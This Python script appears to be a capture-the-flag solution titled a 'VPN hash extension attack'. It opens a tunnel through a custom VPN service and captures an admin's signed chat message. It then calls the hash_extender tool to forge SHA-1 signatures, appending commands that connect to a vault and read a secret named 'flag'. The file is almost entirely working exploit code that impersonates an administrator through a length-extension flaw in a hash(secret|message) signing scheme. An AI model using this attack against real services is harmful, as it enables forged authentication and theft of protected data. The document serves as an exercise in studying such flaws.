#!/usr/bin/env python3

import argparse
import base64
import json
import hashlib
import socket
import subprocess
import time
from datetime import datetime, timezone


def decode_base64(data):
    missing_padding = len(data) % 4
    if missing_padding:
        data += '=' * (4 - missing_padding)
    return base64.b64decode(data)


def parse_auth_config(auth_config_b64):
    try:
        decoded = decode_base64(auth_config_b64)
        cfg = json.loads(decoded)
        return cfg.get("who"), cfg.get("password")
    except Exception as e:
        print(f"Config parse error: {e}")
        return None, None


def sha1_signature(password_b64, ip, payload_json):
    try:
        secret_bytes = decode_base64(password_b64)
    except Exception:
        secret_bytes = password_b64.encode()

    msg = secret_bytes + b'|' + ip.encode() + b'|' + payload_json.encode()
    return hashlib.sha1(msg).hexdigest()


def run_hash_extender(original_data, original_signature, append_data, secret_length=33):
    try:
        result = subprocess.run([
            "hash_extender",
            "-f", "sha1",
            "-d", original_data,
            "-s", original_signature,
            "-a", append_data,
            "-l", str(secret_length),
        ], capture_output=True, text=True)

        if result.returncode != 0:
            print(f"hash-extender error: {result.stderr}")
            return None, None

        new_sig = None
        hex_data = None
        for line in result.stdout.splitlines():
            if line.startswith("New signature: "):
                new_sig = line.replace("New signature: ", "").strip()
            elif line.startswith("New string: "):
                hex_data = line.replace("New string: ", "").strip()

        if not new_sig or not hex_data:
            return None, None

        return bytes.fromhex(hex_data), new_sig

    except FileNotFoundError:
        print("Command 'hash_extender' not found.")
        return None, None
    except Exception as e:
        print(f"hash-extender error: {e}")
        return None, None


def create_message(ip, payload_json, signature_hex):
    vpn_message_bytes = f"{ip}|{payload_json}|{signature_hex}".encode()
    length_str = f"{len(vpn_message_bytes):05d}|".encode()
    return length_str + vpn_message_bytes


def build_message_from_extended(extended_data, extended_signature):
    vpn_message_bytes = extended_data + f"|{extended_signature}".encode()
    length_str = f"{len(vpn_message_bytes):05d}|".encode()
    return length_str + vpn_message_bytes


def send_vpn_message(server_ip, port, message_bytes, description):
    print(f"\n--- {description} ---")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((server_ip, port))
        sock.send(message_bytes)
        
        response = sock.recv(4096)
        resp_text = response.decode('utf-8', errors='ignore')
        print(f"Response: {resp_text}")

        parts = resp_text.split('|')
        if len(parts) >= 4:
            return parts[2], sock
        return resp_text, None
    except Exception as e:
        print(f"Send error: {e}")
        return None, None


def send_vault_message(server_ip, port, message_bytes, description):
    print(f"\n--- {description} ---")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((server_ip, port))
        sock.send(message_bytes)
        
        response = sock.recv(4096)
        resp_text = response.decode('utf-8', errors='ignore')
        print(f"Response: {resp_text}")
        
        parts = resp_text.split('|')
        if len(parts) >= 4:
            return parts[2]
        return resp_text
    except Exception as e:
        print(f"Send error: {e}")
        return None
    finally:
        try:
            sock.close()
        except:
            pass


def open_tunnel(server_ip, my_ip, password, target_ip, target_port):
    payload = {"id": 3, "type": "connect-request", "body": {"target": target_ip, "port": target_port}}
    payload_json = json.dumps(payload, separators=(',', ':'))
    sign = sha1_signature(password, my_ip, payload_json)
    msg_bytes = create_message(my_ip, payload_json, sign)
    
    resp_json, sock = send_vpn_message(server_ip, 4444, msg_bytes, "Open tunnel")
    if not resp_json:
        return None, None

    try:
        data = json.loads(resp_json)
        if isinstance(data, dict):
            port = data.get("connect_port") or data.get("body", {}).get("connect_port")
            return port, sock
    except:
        pass
    return None, None


def wait_for_admin_message(server_ip, port, my_ip, password, timeout_sec=120):
    print("Waiting for admin message...")
    start_time = time.time()
    buffer = ""

    for attempt in range(8):
        if time.time() - start_time > timeout_sec:
            break

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((server_ip, port))
            time.sleep(0.2)

            last_send = 0.0
            while time.time() - start_time < timeout_sec:
                now = time.time()
                if now - last_send > 1.0:
                    chat_msg = {
                        "sender": "lolkek3000",
                        "timestamp": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
                        "content": "hehe haha"
                    }
                    chat_json = json.dumps(chat_msg)
                    chat_sign = sha1_signature(password, my_ip, chat_json)
                    chat_bytes = create_message(my_ip, chat_json, chat_sign)
                    try:
                        sock.sendall(chat_bytes)
                        last_send = now
                    except:
                        break

                try:
                    chunk = sock.recv(4096)
                    if chunk:
                        buffer += chunk.decode('utf-8', errors='ignore')
                        if "10.11.12.2" in buffer and "{" in buffer:
                            parts = buffer.split('|')
                            for i, part in enumerate(parts):
                                if part == "10.11.12.2" and i + 2 < len(parts):
                                    try:
                                        payload = parts[i + 1]
                                        signature = parts[i + 2]
                                        data = json.loads(payload)
                                        content = data.get("content")
                                        if content:
                                            print(f"Admin message: '{content}'")
                                            admin_signed = f"{part}|{payload}"
                                            sock.close()
                                            return admin_signed, signature
                                    except:
                                        pass
                    else:
                        time.sleep(0.2)
                except socket.timeout:
                    continue
                except ConnectionResetError:
                    break
            sock.close()
        except Exception as e:
            print(f"Connection attempt {attempt + 1} failed: {e}")
        
        time.sleep(0.5)

    return None, None


def extract_flag(response):
    try:
        data = json.loads(response)
        if isinstance(data, dict) and "content" in data:
            content = data["content"]
            if "zn2025{" in content:
                return content
    except:
        pass
    
    if isinstance(response, str) and "zn2025{" in response:
        return response
    
    return None


def main():
    parser = argparse.ArgumentParser(description="VPN hash extension attack")
    parser.add_argument("server_ip", help="VPN server IP address")
    parser.add_argument("auth_config", help="Authentication configuration (base64)")
    args = parser.parse_args()

    my_ip, my_secret = parse_auth_config(args.auth_config)
    if not my_ip or not my_secret:
        print("Invalid config")
        return

    print(f"IP: {my_ip}")

    connect_port, vpn_sock = open_tunnel(args.server_ip, my_ip, my_secret, "10.11.12.2", 12346)
    if not connect_port:
        print("Failed to open tunnel")
        return
    print(f"Tunnel port: {connect_port}")

    admin_signed, admin_sig = wait_for_admin_message(args.server_ip, connect_port, my_ip, my_secret)
    
    if vpn_sock:
        vpn_sock.close()

    if not admin_signed or not admin_sig:
        print("No admin message received")
        return

    vault_connect = json.dumps({"id": 3, "type": "connect-request", "body": {"target": "10.11.12.3", "port": 9999}})
    vault_list = json.dumps({"command": "list"})
    vault_read = json.dumps({"command": "read", "title": "flag"})

    connect_ext_data, connect_ext_sig = run_hash_extender(admin_signed, admin_sig, vault_connect)
    list_ext_data, list_ext_sig = run_hash_extender(admin_signed, admin_sig, vault_list)
    read_ext_data, read_ext_sig = run_hash_extender(admin_signed, admin_sig, vault_read)

    if not all([connect_ext_data, list_ext_data, read_ext_data]):
        print("Hash extension failed")
        return

    connect_msg = build_message_from_extended(connect_ext_data, connect_ext_sig)
    connect_resp, sock1 = send_vpn_message(args.server_ip, 4444, connect_msg, "Connect to Vault")
    
    if not connect_resp:
        return

    try:
        data = json.loads(connect_resp)
        vault_port = data.get("connect_port") or data.get("body", {}).get("connect_port")
    except:
        vault_port = None

    if not vault_port:
        if sock1:
            sock1.close()
        return

    time.sleep(0.5)
    list_msg = build_message_from_extended(list_ext_data, list_ext_sig)
    list_resp = send_vault_message(args.server_ip, vault_port, list_msg, "List secrets")

    connect_msg2 = build_message_from_extended(connect_ext_data, connect_ext_sig)
    connect_resp2, sock2 = send_vpn_message(args.server_ip, 4444, connect_msg2, "Reconnect to Vault")
    
    if connect_resp2:
        try:
            data2 = json.loads(connect_resp2)
            vault_port = data2.get("connect_port") or data2.get("body", {}).get("connect_port")
        except:
            pass

    time.sleep(0.5)
    read_msg = build_message_from_extended(read_ext_data, read_ext_sig)
    read_resp = send_vault_message(args.server_ip, vault_port, read_msg, "Read flag")

    if read_resp:
        flag = extract_flag(read_resp)
        if flag:
            print(f"\n🎉 FLAG: {flag} 🎉")

    for sock in [sock1, sock2]:
        try:
            if sock:
                sock.close()
        except:
            pass


if __name__ == "__main__":
    main()